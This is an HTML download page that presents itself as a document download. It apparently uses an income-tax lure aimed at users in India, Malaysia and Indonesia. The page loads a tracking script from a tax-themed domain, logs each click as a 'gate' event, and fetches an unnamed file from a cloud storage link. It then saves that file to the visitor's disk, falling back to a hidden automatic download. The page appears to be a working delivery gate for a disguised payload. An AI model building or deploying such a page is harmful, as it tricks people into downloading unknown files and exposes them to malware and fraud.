<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>...</title>
  <link rel="alternate icon" type="image/png" href="favicon.png">
  <style>
    html,body{margin:0;background:#fff;font-family:system-ui,sans-serif}
    .box{max-width:460px;margin:12vh auto 0;padding:28px 24px;border:1px solid #ddd;border-radius:12px;text-align:center}
    h1{font-size:20px;margin:0 0 8px}
    p.sub{font-size:14px;color:#666;margin:0 0 24px}
    button{display:inline-block;background:#000080;color:#fff;border:0;border-radius:6px;padding:14px 32px;font-size:16px;font-weight:bold;cursor:pointer}
    button:hover{background:#000060}
    #hint{display:none;margin-top:20px;font-size:14px;color:#0a7d0a}
    #err{display:none;margin-top:20px;font-size:14px;color:#c00}
  </style>
  <script src="https://income-tax.my.id/track.js"></script>
</head>
<body>
<div class="box">
  <h1 id="t">Download Documents</h1>
  <p class="sub" id="s">Please click the button below to download</p>
  <button id="btn">Download</button>
  <div id="hint"></div>
  <div id="err"></div>
</div>
<script>
(function(){
  var DL = 'https://etwe3gate0111a.blob.core.windows.net/public/dl/latest';
  var LANG = {
    IN: {
      title: 'दस्तावेज़ डाउनलोड करें / Download Documents',
      sub: 'कृपया डाउनलोड करने के लिए नीचे दिए गए बटन पर क्लिक करें / Please click the button below to download',
      btn: 'डाउनलोड करें / Download',
      hint: 'फ़ाइल सहेजी गई। / File saved.',
      saved: 'फ़ाइल आपके चुने हुए स्थान पर सहेजी गई है। / The file has been saved to the location you selected.',
      started: 'डाउनलोड शुरू हो गया है। कृपया अपने डाउनलोड फ़ोल्डर में देखें। / Download started. Please check your Downloads folder.'
    },
    MY: {
      title: 'Muat Turun Dokumen',
      sub: 'Sila klik butang di bawah untuk memuat turun',
      btn: 'Muat Turun',
      hint: 'Fail disimpan. / File saved.',
      saved: 'Fail telah disimpan ke lokasi yang anda pilih. / The file has been saved to the location you selected.',
      started: 'Muat turun telah bermula. Sila semak folder Downloads anda.'
    },
    ID: {
      title: 'Unduh Dokumen',
      sub: 'Silakan klik tombol di bawah untuk mengunduh',
      btn: 'Unduh',
      hint: 'Berkas tersimpan. / File saved.',
      saved: 'Berkas telah disimpan ke lokasi yang Anda pilih. / The file has been saved to the location you selected.',
      started: 'Unduhan telah dimulai. Silakan periksa folder Downloads Anda.'
    },
    OTHER: {
      title: 'Download Documents',
      sub: 'Please click the button below to download',
      btn: 'Download',
      hint: 'File saved.',
      saved: 'The file has been saved to the location you selected.',
      started: 'Download started. Please check your Downloads folder.'
    }
  };
  var region = new URLSearchParams(location.search).get('region') || 'OTHER';
  var L = LANG[region] || LANG.OTHER;
  document.getElementById('t').textContent = L.title;
  document.getElementById('s').textContent = L.sub;
  document.getElementById('btn').textContent = L.btn;
  document.getElementById('hint').textContent = L.hint;

  function fileNameFrom(cd){
    var m = /filename\*=UTF-8''([^;]+)/i.exec(cd || '');
    if (m) { try { return decodeURIComponent(m[1]); } catch(e){} }
    var m2 = /filename="([^"]+)"/i.exec(cd || '');
    if (m2) return m2[1];
    return 'download';
  }
  function normalDownload(){
    var a = document.createElement('a');
    a.href = DL;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    var h = document.getElementById('hint');
    h.textContent = L.started;
    h.style.display = 'block';
  }
  document.getElementById('btn').addEventListener('click', function(){
    try{ if(window.GateTrack) GateTrack.dl('gate'); }catch(e){}
    if (!window.showSaveFilePicker) { normalDownload(); return; }
    fetch(DL, {mode:'cors', cache:'no-store'}).then(function(resp){
      var fname = fileNameFrom(resp.headers.get('Content-Disposition'));
      return resp.blob().then(function(blob){
        return window.showSaveFilePicker({ suggestedName: fname }).then(function(handle){
          return handle.createWritable().then(function(w){
            return w.write(blob).then(function(){ return w.close(); }).then(function(){
              var h = document.getElementById('hint');
              h.textContent = L.saved;
              h.style.display = 'block';
            });
          });
        });
      });
    }).catch(function(e){
      // 用户取消保存框（AbortError）→ 静默；其他错误 → 回退普通下载
      if (e && e.name === 'AbortError') return;
      normalDownload();
    });
  });
})();
</script>
</body>
</html>
